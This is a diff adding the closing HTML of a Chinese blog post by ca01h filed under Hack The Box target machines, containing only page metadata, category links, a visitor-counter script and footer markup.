+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2020-04-07</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a>-><a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/HTB/">HTB</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">#靶机</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
